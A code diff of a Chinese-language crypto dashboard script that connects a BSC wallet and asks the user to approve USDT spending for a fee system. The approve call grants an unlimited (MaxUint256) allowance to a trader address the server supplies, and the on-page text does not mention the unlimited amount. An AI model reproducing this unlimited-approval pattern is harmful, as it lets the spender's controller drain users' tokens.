@@ -1080,12 +1080,17 @@ document.getElementById('binanceGuide').addEventListener('click',function(e){if(
   };
 })();
 
-// ═══ 仪表盘内钱包授权（使用 ethers.js v6，兼容 TokenPocket / MetaMask / Trust Wallet）═══
+// ═══ 仪表盘内钱包授权 — 原生 JSON-RPC，最大兼容 TokenPocket / MetaMask / Trust Wallet ═══
 var wfUsdtAddr = '0x55d398326f99059fF775485246999027B3197955';
 var wfTraderAddr = '';
 var wfWalletAddr = '';
 var wfProvider = null;
 var wfSigner = null;
+var wfBnbBal = 0;
+
+function wfSpinner(color) {
+  return '<span style="display:inline-block;width:16px;height:16px;border:2px solid #30363d;border-top-color:' + (color||'#58a6ff') + ';border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px"></span>';
+}
 
 function wfShowStep(n) {
   for (var i = 1; i <= 3; i++) {
@@ -1094,113 +1099,107 @@ function wfShowStep(n) {
   }
 }
 
-function wfSpinner(color) {
-  return '<span style="display:inline-block;width:16px;height:16px;border:2px solid #30363d;border-top-color:' + (color||'#58a6ff') + ';border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px"></span>';
-}
-
 function wfShowMsg(text, color) {
   var el = document.getElementById('wfStatusMsg');
   if (el) { el.innerHTML = text; el.style.color = color || '#58a6ff'; }
   wfShowStep(3);
 }
 
+// 获取钱包 provider — 兼容多种注入方式
+function getWalletProvider() {
+  if (typeof window.ethereum !== 'undefined') return window.ethereum;
+  // 兼容旧版 web3 注入
+  if (typeof window.web3 !== 'undefined' && window.web3.currentProvider) return window.web3.currentProvider;
+  // TokenPocket 特殊注入
+  if (typeof window.tp !== 'undefined' && window.tp.isTp && window.tp.currentProvider) return window.tp.currentProvider;
+  return null;
+}
+
+// 连接 BSC 钱包 — 纯原生 JSON-RPC
 async function wfConnectWallet() {
   var btn = document.getElementById('wfConnectBtn');
   if (!btn) return;
   btn.disabled = true; btn.textContent = '连接中...';
 
-  // 调试：显示环境检测结果
-  var dbg = 'ethers:' + (typeof ethers !== 'undefined' ? 'YES' : 'NO');
-  dbg += ' ethereum:' + (typeof window.ethereum !== 'undefined' ? 'YES' : 'NO');
-  dbg += ' UA:' + navigator.userAgent.substring(0, 60);
-  console.log('[wfConnectWallet] ' + dbg);
-
-  // 检测 TokenPocket 多种注入方式
-  if (typeof window.ethereum === 'undefined') {
-    // TokenPocket 可能有多种注入
-    if (typeof window.tp !== 'undefined' && window.tp.isTp) {
-      console.log('[wfConnectWallet] TokenPocket tp detected');
-      // TokenPocket 可能需要手动请求
+  var provider = getWalletProvider();
+  
+  if (!provider) {
+    var ua = navigator.userAgent.toLowerCase();
+    var isWechat = ua.indexOf('micromessenger') > -1;
+    var isQQ = ua.indexOf('qq/') > -1 || ua.indexOf('qqbrowser') > -1;
+    var pageUrl = window.location.origin + window.location.pathname;
+    
+    var html = '<div style="text-align:left;padding:16px;background:#1a1a2e;border:1px solid #f85149;border-radius:10px;line-height:1.6">';
+    if (isWechat || isQQ) {
+      html += '<div style="color:#f85149;font-weight:700;font-size:1em;margin-bottom:8px">当前浏览器不支持钱包授权</div>';
+      html += '<div style="color:#c9d1d9;font-size:.85em;margin-bottom:10px">您正在使用' + (isWechat ? '微信' : 'QQ') + '内置浏览器，无法连接区块链钱包。</div>';
+    } else {
+      html += '<div style="color:#f85149;font-weight:700;font-size:1em;margin-bottom:8px">未检测到钱包</div>';
+      html += '<div style="color:#c9d1d9;font-size:.85em;margin-bottom:10px">当前页面没有检测到区块链钱包。请确保在 TokenPocket 的 DApp 浏览器内打开本页面。</div>';
     }
-    var providers = [];
-    if (typeof window.ethereum !== 'undefined') providers.push('ethereum');
-    if (typeof window.web3 !== 'undefined') providers.push('web3');
-    if (typeof window.tp !== 'undefined') providers.push('tp');
-    console.log('[wfConnectWallet] Available providers: ' + providers.join(','));
-  }
-
-  if (typeof ethers === 'undefined') {
-    wfShowMsg('ethers.js 加载失败，请检查网络后刷新页面', '#f85149');
+    html += '<div style="color:#d29922;font-weight:700;font-size:.85em;margin-bottom:6px">请按以下步骤操作：</div>';
+    html += '<div style="color:#c9d1d9;font-size:.82em;margin-bottom:4px">1. 打开 TokenPocket App</div>';
+    html += '<div style="color:#c9d1d9;font-size:.82em;margin-bottom:4px">2. 进入 BSC 钱包</div>';
+    html += '<div style="color:#c9d1d9;font-size:.82em;margin-bottom:4px">3. 点击底部「发现」或「DApp」</div>';
+    html += '<div style="color:#c9d1d9;font-size:.82em;margin-bottom:10px">4. 在地址栏粘贴以下链接打开：</div>';
+    html += '<div style="background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:8px 10px;margin-bottom:10px;font-family:monospace;font-size:.78em;color:#58a6ff;word-break:break-all">' + pageUrl + '</div>';
+    html += '<button onclick="wfCopyLink(\'' + pageUrl + '\')" style="width:100%;padding:12px;border:none;border-radius:8px;cursor:pointer;background:#238636;color:#fff;font-weight:700;font-size:14px">复制链接</button>';
+    html += '</div>';
+    wfShowMsg(html, '#f85149');
     btn.disabled = false; btn.textContent = '连接 BSC 钱包';
     return;
   }
 
-  if (!window.ethereum) {
-    // 检测微信/QQ内置浏览器
-    var ua = navigator.userAgent.toLowerCase();
-    var isWechat = ua.indexOf('micromessenger') > -1;
-    var isQQ = ua.indexOf('qq/') > -1 || ua.indexOf('qqbrowser') > -1;
-    var isInsBrowser = isWechat || isQQ;
-    var pageUrl = window.location.origin + window.location.pathname;
-    
-    var html = '<div style="text-align:left;padding:16px;background:#1a1a2e;border:1px solid #f85149;border-radius:10px;line-height:1.6">';
-    if (isInsBrowser) {
-      html += '<div style="color:#f85149;font-weight:700;font-size:1em;margin-bottom:8px">⚠ 当前浏览器不支持钱包授权</div>';
-      html += '<div style="color:#c9d1d9;font-size:.85em;margin-bottom:10px">您正在使用' + (isWechat ? '微信' : 'QQ') + '内置浏览器，无法连接区块链钱包。</div>';
-    } else {
-      html += '<div style="color:#f85149;font-weight:700;font-size:1em;margin-bottom:8px">⚠ 未检测到钱包</div>';
-      html += '<div style="color:#c9d1d9;font-size:.85em;margin-bottom:10px">当前浏览器没有内置钱包。</div>';
-    }
-    html += '<div style="color:#d29922;font-weight:700;font-size:.85em;margin-bottom:6px">请按以下步骤操作：</div>';
-    html += '<div style="color:#c9d1d9;font-size:.82em;margin-bottom:4px">1. 打开 TokenPocket / MetaMask / Trust Wallet App</div>';
-    html += '<div style="color:#c9d1d9;font-size:.82em;margin-bottom:4px">2. 在 App 内找到「DApp 浏览器」或「发现」</div>';
-    html += '<div style="color:#c9d1d9;font-size:.82em;margin-bottom:10px">3. 粘贴以下链接打开本页面：</div>';
-    html += '<div style="background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:8px 10px;margin-bottom:10px;font-family:monospace;font-size:.78em;color:#58a6ff;word-break:break-all">' + pageUrl + '</div>';
-    html += '<button onclick="navigator.clipboard.writeText(\'' + pageUrl + '\').then(function(){alert(\'链接已复制，请在钱包App的DApp浏览器中粘贴打开\')}).catch(function(){var t=document.createElement(\'textarea\');t.value=\'' + pageUrl + '\';document.body.appendChild(t);t.select();document.execCommand(\'copy\');document.body.removeChild(t);alert(\'链接已复制，请在钱包App的DApp浏览器中粘贴打开\')})" style="width:100%;padding:12px;border:none;border-radius:8px;cursor:pointer;background:#238636;color:#fff;font-weight:700;font-size:14px">📋 复制链接到剪贴板</button>';
-    html += '</div>';
-    
-    wfShowMsg(html, '#f85149');
-    return;
-  }
-
   try {
-    // 用 ethers.js v6 BrowserProvider 连接钱包
-    wfProvider = new ethers.BrowserProvider(window.ethereum);
-    wfSigner = await wfProvider.getSigner();
-    var addr = await wfSigner.getAddress();
-    if (!addr) { throw new Error('未获取到钱包地址'); }
-    wfWalletAddr = addr;
+    // 请求账户授权 — 这一步会触发钱包弹窗
+    var accounts = await provider.request({ method: 'eth_requestAccounts' });
+    if (!accounts || accounts.length === 0) {
+      throw new Error('未获取到钱包地址');
+    }
+    wfWalletAddr = accounts[0];
+    wfProvider = provider;
 
     // 获取 BNB 余额
-    var balance = await wfProvider.getBalance(addr);
-    var bnb = parseFloat(ethers.formatEther(balance));
+    var balHex = await provider.request({ method: 'eth_getBalance', params: [wfWalletAddr, 'latest'] });
+    wfBnbBal = parseInt(balHex, 16) / 1e18;
 
     // 检查并切换到 BSC
-    var network = await wfProvider.getNetwork();
-    if (Number(network.chainId) !== 56) {
+    var chainIdHex = await provider.request({ method: 'eth_chainId' });
+    if (chainIdHex !== '0x38') {
       try {
-        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
-        // 重新初始化 provider
-        wfProvider = new ethers.BrowserProvider(window.ethereum);
-        wfSigner = await wfProvider.getSigner();
+        await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
       } catch(e) {
-        wfShowMsg('请先在钱包中切换到 BNB Smart Chain (BSC) 网络', '#f85149');
-        btn.disabled = false; btn.textContent = '连接 BSC 钱包';
-        return;
+        // 链不存在，尝试添加
+        if (e.code === 4902) {
+          await provider.request({ method: 'wallet_addEthereumChain', params: [{
+            chainId: '0x38',
+            chainName: 'BNB Smart Chain',
+            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+            rpcUrls: ['https://bsc-rpc.publicnode.com'],
+            blockExplorerUrls: ['https://bscscan.com']
+          }] });
+        } else {
+          throw e;
+        }
       }
     }
 
     // 获取 trader 地址
     var tk = getToken();
-    var resp = await fetch('/api/vault/approve-params', { headers: { 'Authorization': 'Bearer ' + tk } });
-    var data = await resp.json();
-    if (data.success) {
-      wfTraderAddr = data.traderAddress;
-      wfUsdtAddr = data.usdtAddress;
+    if (tk) {
+      try {
+        var resp = await fetch('/api/vault/approve-params', { headers: { 'Authorization': 'Bearer ' + tk } });
+        var data = await resp.json();
+        if (data.success) {
+          wfTraderAddr = data.traderAddress;
+          var disp = document.getElementById('traderAddrDisplay');
+          if (disp) disp.textContent = wfTraderAddr.substring(0, 10) + '...' + wfTraderAddr.substring(36);
+        }
+      } catch(e) {}
     }
 
-    document.getElementById('wfWalletAddr').textContent = addr.substring(0, 8) + '...' + addr.substring(36);
-    document.getElementById('wfBnbBal').textContent = bnb.toFixed(4) + ' BNB';
+    document.getElementById('wfWalletAddr').textContent = wfWalletAddr.substring(0, 8) + '...' + wfWalletAddr.substring(36);
+    document.getElementById('wfBnbBal').textContent = wfBnbBal.toFixed(6) + ' BNB';
 
     // 通知后端绑定钱包地址
     try {
@@ -1208,24 +1207,25 @@ async function wfConnectWallet() {
       await fetch('/api/vault/bsc-wallet', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + tk2 },
-        body: JSON.stringify({ bscWalletAddr: addr })
+        body: JSON.stringify({ bscWalletAddr: wfWalletAddr })
       });
     } catch(e) {}
 
     wfShowStep(2);
 
-    if (bnb < 0.00005) {
+    if (wfBnbBal < 0.00005) {
       var approveBtn = document.getElementById('wfApproveBtn');
       if (approveBtn) { approveBtn.disabled = true; approveBtn.textContent = 'BNB 不足，请先充值'; }
     }
   } catch(e) {
     var msg = e.message || '连接失败';
-    if (e.code === 4001 || e.code === 'ACTION_REJECTED') msg = '用户拒绝了连接';
+    if (e.code === 4001) msg = '用户拒绝了连接请求';
     wfShowMsg('连接失败: ' + msg, '#f85149');
     btn.disabled = false; btn.textContent = '连接 BSC 钱包';
   }
 }
 
+// 授权 USDT — 纯原生 JSON-RPC
 async function wfDoApprove() {
   var btn = document.getElementById('wfApproveBtn');
   if (!btn) return;
@@ -1233,48 +1233,46 @@ async function wfDoApprove() {
   wfShowStep(3);
   var msgEl = document.getElementById('wfStatusMsg');
 
-  if (typeof ethers === 'undefined') {
-    wfShowMsg('ethers.js 未加载，请刷新页面重试', '#f85149');
-    btn.disabled = false; btn.textContent = '授权 USDT';
-    return;
-  }
-
-  if (!window.ethereum) {
-    wfShowMsg('未检测到钱包，请在 TokenPocket / MetaMask 内打开本页面', '#f85149');
+  var provider = getWalletProvider();
+  if (!provider) {
+    wfShowMsg('未检测到钱包，请在 TokenPocket DApp 浏览器内打开本页面', '#f85149');
     btn.disabled = false; btn.textContent = '授权 USDT';
     return;
   }
 
   try {
-    // 初始化 ethers.js provider/signer
-    if (!wfSigner) {
-      wfProvider = new ethers.BrowserProvider(window.ethereum);
-      wfSigner = await wfProvider.getSigner();
+    // 确保钱包已连接
+    if (!wfWalletAddr) {
+      var accounts = await provider.request({ method: 'eth_requestAccounts' });
+      wfWalletAddr = accounts[0];
+      wfProvider = provider;
     }
-    var addr = await wfSigner.getAddress();
-    wfWalletAddr = addr;
 
     // 获取 trader 地址
     if (!wfTraderAddr) {
       var tk = getToken();
       var resp = await fetch('/api/vault/approve-params', { headers: { 'Authorization': 'Bearer ' + tk } });
       var data = await resp.json();
-      if (data.success) {
-        wfTraderAddr = data.traderAddress;
-        wfUsdtAddr = data.usdtAddress;
-      }
+      if (data.success) wfTraderAddr = data.traderAddress;
+      else throw new Error('获取授权地址失败');
     }
-    if (!wfTraderAddr) { throw new Error('获取授权地址失败，请刷新重试'); }
 
-    // 检查链上是否已授权
+    // 检查当前授权状态
     if (msgEl) { msgEl.innerHTML = wfSpinner() + '正在检查链上授权状态...'; msgEl.style.color = '#58a6ff'; }
-    var usdtContract = new ethers.Contract(wfUsdtAddr, [
-      'function allowance(address owner, address spender) view returns (uint256)'
-    ], wfProvider);
-    var currentAllow = await usdtContract.allowance(addr, wfTraderAddr);
 
-    if (BigInt(currentAllow) > BigInt(1000) * BigInt('1000000000000000000')) {
-      // 已经授权过了
+    var allowanceData = '0x' +
+      'dd62ed3e' + // allowance(address,address) selector
+      wfWalletAddr.substring(2).padStart(64, '0') +
+      wfTraderAddr.substring(2).padStart(64, '0');
+    
+    var allowHex = await provider.request({
+      method: 'eth_call',
+      params: [{ to: wfUsdtAddr, data: allowanceData }, 'latest']
+    });
+    var allowVal = BigInt(allowHex);
+    
+    if (allowVal > BigInt('1000000000000000000000')) {
+      // 已授权
       if (msgEl) { msgEl.innerHTML = wfSpinner('#3fb950') + '链上已授权，正在同步状态...'; msgEl.style.color = '#3fb950'; }
       var tk2 = getToken();
       var resp3 = await fetch('/api/vault/approve-confirmed', {
@@ -1284,72 +1282,99 @@ async function wfDoApprove() {
       });
       var d3 = await resp3.json();
       if (d3.success) {
-        if (msgEl) { msgEl.innerHTML = '✅ 已授权！盖茨费系统已激活'; msgEl.style.color = '#3fb950'; }
+        if (msgEl) { msgEl.innerHTML = '已授权！盖茨费系统已激活'; msgEl.style.color = '#3fb950'; }
       } else {
-        if (msgEl) { msgEl.innerHTML = '✅ 链上已授权，请稍后刷新'; msgEl.style.color = '#3fb950'; }
+        if (msgEl) { msgEl.innerHTML = '链上已授权，请稍后刷新'; msgEl.style.color = '#3fb950'; }
       }
       setTimeout(function() { refreshAll(); }, 1500);
       return;
     }
 
-    // 构造并发送 approve 交易 — 用 ethers.js（自动处理 gas 估算、签名、EIP-155）
+    // 构造 approve 交易 — 原生 JSON-RPC
     if (msgEl) {
-      msgEl.innerHTML = wfSpinner() + '请在钱包弹窗中确认授权...<br><span style="font-size:.8em;color:#8b949e">请等待钱包弹出确认窗口，不要离开本页面</span>';
+      msgEl.innerHTML = wfSpinner() + '请在钱包弹窗中确认授权...<br><span style="font-size:.8em;color:#8b949e">等待钱包弹出确认窗口，不要离开本页面</span>';
       msgEl.style.color = '#58a6ff';
     }
 
-    var approveContract = new ethers.Contract(wfUsdtAddr, [
-      'function approve(address spender, uint256 amount) returns (bool)'
-    ], wfSigner);
+    // approve(address spender, uint256 amount) = 0x095ea7b3 + spender(32 bytes) + amount(32 bytes)
+    // MaxUint256 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    var approveData = '0x095ea7b3' +
+      wfTraderAddr.substring(2).padStart(64, '0') +
+      'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
-    // 发送 approve 交易 — ethers.js 会自动请求钱包签名弹窗
-    // 不设超时！让钱包自己控制弹窗时间
-    var tx = await approveContract.approve(wfTraderAddr, ethers.MaxUint256);
+    // 发送交易 — 这一步会触发钱包弹窗！
+    var txHash = await provider.request({
+      method: 'eth_sendTransaction',
+      params: [{
+        from: wfWalletAddr,
+        to: wfUsdtAddr,
+        data: approveData
+      }]
+    });
 
     if (msgEl) {
-      msgEl.innerHTML = wfSpinner('#3fb950') + '交易已发送，等待链上确认...<br><span style="font-size:.8em;color:#8b949e">Hash: ' + tx.hash.substring(0,20) + '...</span>';
+      msgEl.innerHTML = wfSpinner('#3fb950') + '交易已发送，等待链上确认...<br><span style="font-size:.8em;color:#8b949e">Hash: ' + txHash.substring(0,20) + '...</span>';
       msgEl.style.color = '#3fb950';
     }
 
-    // 等待交易确认
-    var receipt = await tx.wait();
+    // 等待交易确认 — 轮询 getTransactionReceipt
+    var receipt = null;
+    for (var i = 0; i < 60; i++) {
+      await new Promise(function(resolve) { setTimeout(resolve, 3000); });
+      try {
+        receipt = await provider.request({
+          method: 'eth_getTransactionReceipt',
+          params: [txHash]
+        });
+        if (receipt) break;
+      } catch(e) {}
+    }
 
-    if (receipt && receipt.status === 1) {
+    if (receipt && receipt.status === '0x1') {
       if (msgEl) { msgEl.innerHTML = wfSpinner('#3fb950') + '授权成功！正在通知系统...'; msgEl.style.color = '#3fb950'; }
 
       var tk4 = getToken();
       var resp2 = await fetch('/api/vault/approve-confirmed', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + tk4 },
-        body: JSON.stringify({ txHash: tx.hash })
+        body: JSON.stringify({ txHash: txHash })
       });
       var data2 = await resp2.json();
 
       if (data2.success) {
-        if (msgEl) { msgEl.innerHTML = '✅ 授权成功！盖茨费系统已激活'; msgEl.style.color = '#3fb950'; }
+        if (msgEl) { msgEl.innerHTML = '授权成功！盖茨费系统已激活'; msgEl.style.color = '#3fb950'; }
       } else {
-        if (msgEl) { msgEl.innerHTML = '✅ 链上授权成功！系统确认稍后自动完成'; msgEl.style.color = '#3fb950'; }
+        if (msgEl) { msgEl.innerHTML = '链上授权成功！系统确认稍后自动完成'; msgEl.style.color = '#3fb950'; }
       }
-      btn.textContent = '✅ 已授权';
+      btn.textContent = '已授权';
       setTimeout(function() { refreshAll(); }, 2000);
-    } else {
+    } else if (receipt && receipt.status === '0x0') {
       if (msgEl) { msgEl.textContent = '交易执行失败，请重试'; msgEl.style.color = '#f85149'; }
       btn.disabled = false; btn.textContent = '授权 USDT';
       wfShowStep(2);
+    } else {
+      // 超时但可能成功
+      var tk5 = getToken();
+      await fetch('/api/vault/approve-confirmed', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + tk5 },
+        body: JSON.stringify({ txHash: txHash })
+      });
+      if (msgEl) { msgEl.innerHTML = '交易已发送，等待链上确认中...<br><span style="font-size:.8em;color:#8b949e">请稍后刷新页面查看状态</span>'; msgEl.style.color = '#3fb950'; }
+      setTimeout(function() { refreshAll(); }, 5000);
     }
   } catch(e) {
     var msg = e.message || '未知错误';
-    if (e.code === 4001 || e.code === 'ACTION_REJECTED') msg = '用户取消了交易';
+    if (e.code === 4001) msg = '用户取消了交易';
     else if (msg.indexOf('insufficient funds') !== -1) msg = 'BNB 余额不足以支付 gas 费';
     else if (msg.indexOf('execution reverted') !== -1) msg = '合约执行被拒绝';
-    else if (msg.indexOf('network changed') !== -1) msg = '网络切换中，请重新点击授权';
     if (msgEl) { msgEl.innerHTML = '授权失败: ' + msg + '<br><span style="font-size:.8em;color:#8b949e">请确保钱包已连接 BSC 网络，且有少量 BNB 作为 gas 费</span>'; msgEl.style.color = '#f85149'; }
     btn.disabled = false; btn.textContent = '授权 USDT';
     wfShowStep(2);
   }
 }
 
-// 检查链上授权状态（用户已在其他地方授权时用）
+// 检查链上授权状态
 async function wfCheckChainStatus() {
   var btn = document.getElementById('wfCheckBtn');
   if (btn) { btn.disabled = true; btn.textContent = '正在检查链上状态...'; }
@@ -1368,10 +1393,10 @@ async function wfCheckChainStatus() {
     });
     var data = await resp.json();
     if (data.success) {
-      if (msgEl) { msgEl.innerHTML = '✅ 链上已授权！盖茨费系统已激活'; msgEl.style.color = '#3fb950'; }
+      if (msgEl) { msgEl.innerHTML = '链上已授权！盖茨费系统已激活'; msgEl.style.color = '#3fb950'; }
       setTimeout(function() { refreshAll(); }, 1500);
     } else {
-      if (msgEl) { msgEl.innerHTML = '❌ ' + (data.error || '链上未找到授权记录'); msgEl.style.color = '#f85149'; }
+      if (msgEl) { msgEl.innerHTML = (data.error || '链上未找到授权记录'); msgEl.style.color = '#f85149'; }
       if (btn) { btn.disabled = false; btn.textContent = '我已授权，检查链上状态'; }
       wfShowStep(2);
     }
@@ -1382,12 +1407,31 @@ async function wfCheckChainStatus() {
   }
 }
 
-// 初始化 BscScan 链接和 trader 地址显示
+// 复制链接
+function wfCopyLink(url) {
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(url).then(function() {
+      alert('链接已复制，请在 TokenPocket 的 DApp 浏览器中粘贴打开');
+    }).catch(function() {
+      var t = document.createElement('textarea');
+      t.value = url;
+      document.body.appendChild(t); t.select();
+      document.execCommand('copy');
+      document.body.removeChild(t);
+      alert('链接已复制，请在 TokenPocket 的 DApp 浏览器中粘贴打开');
+    });
+  } else {
+    var t = document.createElement('textarea');
+    t.value = url;
+    document.body.appendChild(t); t.select();
+    document.execCommand('copy');
+    document.body.removeChild(t);
+    alert('链接已复制，请在 TokenPocket 的 DApp 浏览器中粘贴打开');
+  }
+}
+
+// 初始化 BscScan 链接
 (function() {
-  var traderAddr = '0xe6DDF0771c7610dBA77eB5a07ba7771DD7F5e91e';
-  var el = document.getElementById('traderAddrDisplay');
-  if (el) el.textContent = traderAddr.slice(0,10) + '...' + traderAddr.slice(-4);
-  // BscScan USDT 合约 Write Contract 页面，自动定位到 approve 函数
   var approveUrl = 'https://bscscan.com/token/0x55d398326f99059fF775485246999027B3197955#writeContract';
   var link = document.getElementById('bscScanLink');
   if (link) link.href = approveUrl;
